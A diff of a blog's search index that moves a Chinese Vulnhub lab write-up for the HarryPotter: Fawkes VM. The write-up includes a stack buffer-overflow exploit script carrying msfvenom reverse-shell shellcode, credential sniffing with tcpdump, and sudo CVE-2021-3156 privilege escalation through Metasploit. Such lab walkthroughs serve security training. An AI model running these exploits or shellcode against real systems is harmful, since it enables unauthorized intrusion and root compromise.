@@ -332,6 +332,205 @@
       </tags>
   </entry>
   <entry>
+    <title>12 Vulnhub HarryPotterFawkes Writeup</title>
+    <url>/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
+<li>这是一个系列的靶机，漏洞都非常的奇特！</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>高</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li><p>取得2个root权限</p></li>
+<li><p>拿到3个Flag</p></li>
+</ul>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>web信息收集</li>
+<li><strong>FTP服务攻击</strong></li>
+<li><strong>缓冲区溢出</strong></li>
+<li><strong>模糊测试</strong></li>
+<li>漏洞利用代码编写</li>
+<li><strong>流量抓包分析</strong></li>
+<li><strong>堆溢出漏洞攻击</strong></li>
+<li>Metasploit（MSF）</li>
+<li>手动修复EXP代码</li>
+<li>本地提权</li>
+</ul>
+<p>参考资料：</p>
+<ul>
+<li><a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
+<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
+</ul>
+<h1 id="渗透">2 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
+<p>信息如下：</p>
+<ul>
+<li>21端口的服务是ftp，版本为vsfttpd 3.0.3，可以匿名登录，并且存在一个文件<code>server_hogwarts</code></li>
+<li>22端口的服务是ssh，版本是OpenSSH 7.9，</li>
+<li>80端口的服务是http，版本为Apache 2.4.38</li>
+<li>2222端口的服务也是ssh，版本为OpenSSH 2.4.38</li>
+<li>9898端口的服务未知，所以随便给了一个monkeycom</li>
+<li>靶机的操作系统为Debian</li>
+</ul>
+<h2 id="访问http服务">2.2 访问http服务</h2>
+<p>直接访问80端口，发现这个网页非常的刚进，只有一张图片。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
+<p>因此尝试进行路径扫描，也没有什么有用的发现</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
+<h2 id="访问ftp服务">2.3 访问ftp服务</h2>
+<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
+<p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
+<h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
+<p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
+<p>信息：</p>
+<ul>
+<li>该文件是一个二进制的可执行文件（elf是Linux的可执行文件格式），并且是32位的</li>
+<li>说明对方系统是能够运行32位的软件，即<code>x86</code>架构</li>
+</ul>
+<p>首先执行这文件看一下会发生什么，结果是无事发生，查看进程是否存在对应的进程，发现确实存在</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
+<p>查看其所在的端口</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
+<p>发现开了9898端口，联想到端口扫描的时候，靶机上也开了9898端口，因此，靶机上的9898端口对应的服务应该就是这个。现在本地用nc连接上看一下该服务的功能。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
+<p>功能非常简单，我们输入对应的字符串，服务返回对应的字符串，就一个功能点。连接靶机的9898端口，发现功能是一模一样的，接下来只能通过查看该文件是否存在缓冲区溢出漏洞来判断靶机上也存在相应的漏洞。</p>
+<p>在测试之前，需要先把aslr关掉。</p>
+<blockquote>
+<p>该技术简单来说就是每次启用程序的时候的内存地址总是随机的，这样子即使存在缓冲区溢出漏洞，也会因为每次启动程序的地址不同导致第一次出现漏洞的地址A和第二次出现漏洞的地址B不同，使得即使存在漏洞也无法利用。</p>
+</blockquote>
+<p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
+<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="查找漏洞">2.4.1 查找漏洞</h3>
+<p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
+<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
+<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
+<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
+<p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
+<blockquote>
+<ol type="1">
+<li>EIP寄存器里存储的是CPU下次要执行的指令的地址；</li>
+<li>EBP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
+<li>ESP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
+</ol>
+</blockquote>
+<p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以将EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
+<h3 id="利用漏洞">2.4.2 利用漏洞</h3>
+<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
+<p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
+<p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
+<p>记住地址，写入payload的时候记得反过来！</p>
+<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
+<p>解释：</p>
+<ul>
+<li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
+<li><code>'\x90'*32*</code>：<code>\x90</code>空，读到该字节就会继续读取下一个。这是一个技巧，使程序更稳定。如果代码的字节很紧凑，可能执行过程不会按照预期，适当的插入null不会影响执行过程，反而能够使程序的运行更加稳定。</li>
+<li>不能用python3，否则会因为payload中既有字节又有字符而报错！</li>
+</ul>
+<p>接着：</p>
+<ol type="1">
+<li>启动服务</li>
+<li>监听4444端口</li>
+<li>执行该程序<code>./exp.py</code>或者<code>python exp.py</code>都可以，不过一定要确保服务开启</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
+<p>接下来修改脚本，将IP地址改为<code>10.0.2.16</code>即可，然后执行该脚本，讲道理就能够获得靶机的shell。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
+<h2 id="信息收集">2.5 信息收集</h2>
+<p>输入<code>/bin/sh -i</code>拿到可用的shell。要加`-i。</p>
+<p>当我发现该shell的IP时察觉到不对劲</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
+<p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
+<p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
+<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
+<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
+<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
+<p>base64解码：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
+<p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
+<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
+<p>过了一会开始有了数据包：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
+<p>前面的3个为tcp握手过程，注意红框中的信息：</p>
+<ul>
+<li>第一个红框：ftp的语法，USER后面跟的是要登录的用户名</li>
+<li>第二个红框：服务器要求对方输入密码</li>
+<li>第三个红框：ftp语法，PASS后面跟的是密码</li>
+<li>第四个红框：登陆失败</li>
+</ul>
+<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
+<p>尝试登录另一个端口的ssh</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
+<p>登录成功，并且成功来到真实的靶机。</p>
+<h2 id="权限提升">2.6 权限提升</h2>
+<p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
+<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
+<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>但是提示失败了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
+<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
+<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
+<p>提权成功！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
+<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
+<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">3 总结</h1>
+<p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
+<p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
+<p>最后，通过抓包分析得到ssh用户名和密码也是非常新颖的。</p>
+<h2 id="aslr技术">3.1 ASLR技术</h2>
+<p>ASLR（Address Space Layout Randomization，地址空间随机化）技术通过加载程序的时候使用不固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
+<p>需要注意以下几点：</p>
+<ul>
+<li>它并不能解决漏洞，而是增加了利用漏洞的难度；</li>
+<li>它不追踪或报告漏洞</li>
+<li>不能对编译时没有开启ASLR支持的二进制文件提供保护</li>
+<li>不能避免被绕过</li>
+</ul>
+<p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR 加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
+<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
+<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>FTP服务攻击</tag>
+        <tag>流量抓包分析</tag>
+        <tag>堆溢出漏洞攻击:CVE-2021-3156</tag>
+        <tag>缓冲区溢出漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>11 Vulnhub Billu_b0x Writeup</title>
     <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为中等，不过存在多种思路。肯定还有一些我没有记录到。该靶机的漏洞都比较常规，但是组合起来就有了非常好的表现！</p>
@@ -493,205 +692,6 @@
         <tag>图片马</tag>
         <tag>源码审计</tag>
         <tag>任意文件读取</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>12 Vulnhub HarryPotterFawkes Writeup</title>
-    <url>/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。</p>
-<span id="more"></span>
-<h1 id="靶机信息">1 靶机信息</h1>
-<p>靶机地址：</p>
-<ul>
-<li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
-<li>这是一个系列的靶机，漏洞都非常的奇特！</li>
-</ul>
-<p>难度：</p>
-<ul>
-<li>高</li>
-</ul>
-<p>目标：</p>
-<ul>
-<li><p>取得2个root权限</p></li>
-<li><p>拿到3个Flag</p></li>
-</ul>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>web信息收集</li>
-<li><strong>FTP服务攻击</strong></li>
-<li><strong>缓冲区溢出</strong></li>
-<li><strong>模糊测试</strong></li>
-<li>漏洞利用代码编写</li>
-<li><strong>流量抓包分析</strong></li>
-<li><strong>堆溢出漏洞攻击</strong></li>
-<li>Metasploit（MSF）</li>
-<li>手动修复EXP代码</li>
-<li>本地提权</li>
-</ul>
-<p>参考资料：</p>
-<ul>
-<li><a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
-<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
-</ul>
-<h1 id="渗透">2 渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
-<p>信息如下：</p>
-<ul>
-<li>21端口的服务是ftp，版本为vsfttpd 3.0.3，可以匿名登录，并且存在一个文件<code>server_hogwarts</code></li>
-<li>22端口的服务是ssh，版本是OpenSSH 7.9，</li>
-<li>80端口的服务是http，版本为Apache 2.4.38</li>
-<li>2222端口的服务也是ssh，版本为OpenSSH 2.4.38</li>
-<li>9898端口的服务未知，所以随便给了一个monkeycom</li>
-<li>靶机的操作系统为Debian</li>
-</ul>
-<h2 id="访问http服务">2.2 访问http服务</h2>
-<p>直接访问80端口，发现这个网页非常的刚进，只有一张图片。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
-<p>因此尝试进行路径扫描，也没有什么有用的发现</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
-<h2 id="访问ftp服务">2.3 访问ftp服务</h2>
-<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
-<p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
-<h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
-<p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
-<p>信息：</p>
-<ul>
-<li>该文件是一个二进制的可执行文件（elf是Linux的可执行文件格式），并且是32位的</li>
-<li>说明对方系统是能够运行32位的软件，即<code>x86</code>架构</li>
-</ul>
-<p>首先执行这文件看一下会发生什么，结果是无事发生，查看进程是否存在对应的进程，发现确实存在</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
-<p>查看其所在的端口</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
-<p>发现开了9898端口，联想到端口扫描的时候，靶机上也开了9898端口，因此，靶机上的9898端口对应的服务应该就是这个。现在本地用nc连接上看一下该服务的功能。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
-<p>功能非常简单，我们输入对应的字符串，服务返回对应的字符串，就一个功能点。连接靶机的9898端口，发下功能是一摸一样的，接下来只能通过查看该文件是否存在缓冲区溢出漏洞来判断靶机上也存在相应的漏洞。</p>
-<p>在测试之前，需要先把aslr关掉。</p>
-<blockquote>
-<p>该技术简单来说就是每次启用程序的时候的内存地址总是随机的，这样子即使存在缓冲区溢出漏洞，也会因为每次启动程序的地址不同导致第一次出现漏洞的地址A和第二次出现漏洞的地址B不同，使得即使存在漏洞也无法利用。</p>
-</blockquote>
-<p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
